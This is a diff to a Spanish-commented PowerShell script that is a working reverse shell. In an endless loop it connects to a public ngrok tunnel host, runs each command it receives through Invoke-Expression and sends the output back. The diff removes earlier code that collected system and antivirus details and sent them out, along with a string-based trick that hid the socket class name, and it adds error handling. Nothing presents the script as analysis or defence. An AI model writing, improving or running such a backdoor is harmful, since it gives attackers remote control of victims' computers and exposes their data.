@@ -16,41 +16,24 @@ function ConvertFrom-ByteArray {
 
 while ($true) {
     try {
-        # Generación de valores aleatorios codificados en Base64
-        $Base64 = [Convert]::ToBase64String((1..32 | %{ [byte](Get-Random -Minimum 0 -Maximum 255) }))
-        $Key = [Convert]::FromBase64String($Base64)
-
-        # Recopilación de información del sistema
-        $SystemInfo = @{
-            'System' = (Get-WmiObject Win32_OperatingSystem).Caption
-            'Version' = (Get-WmiObject Win32_OperatingSystem).Version
-            'Architecture' = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
-            'WindowsDirectory' = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory
-            'AV' = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayName
-        }
-        $SystemInfoStr = $SystemInfo | Out-String
-
         # Configuración de la dirección IP y puerto de ngrok
         $ipAddress = "7.tcp.eu.ngrok.io"
         $port = 10624
 
-        # Cadena larga para ofuscación
-        $r = "LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur."
-
-        # Uso de la cadena para ofuscación (ajustar según sea necesario)
-        Set-Alias Luna ConvertFrom-ByteArray
-        $client = New-Object (Luna $r)($ipAddress, $port)
+        # Creación del cliente TCP
+        $client = New-Object System.Net.Sockets.TCPClient($ipAddress, $port)
         $stream = $client.GetStream()
         [byte[]]$buffer = 0..65535|%{0}
-
-        # Envío de la información del sistema
-        $encodedSystemInfo = [System.Text.Encoding]::ASCII.GetBytes($SystemInfoStr)
-        $stream.Write($encodedSystemInfo, 0, $encodedSystemInfo.Length)
 
         # Bucle de lectura y escritura
         while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
             $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
-            $output = Invoke-Expression $command 2>&1 | Out-String
+            try {
+                # Ejecución del comando y captura de la salida
+                $output = Invoke-Expression $command 2>&1 | Out-String
+            } catch {
+                $output = "Error en la ejecución del comando: $_"
+            }
             $response = [System.Text.Encoding]::ASCII.GetBytes($output)
             $stream.Write($response, 0, $response.Length)
         }
@@ -62,3 +45,4 @@ while ($true) {
     }
     Start-Sleep -Seconds 5
 }
+
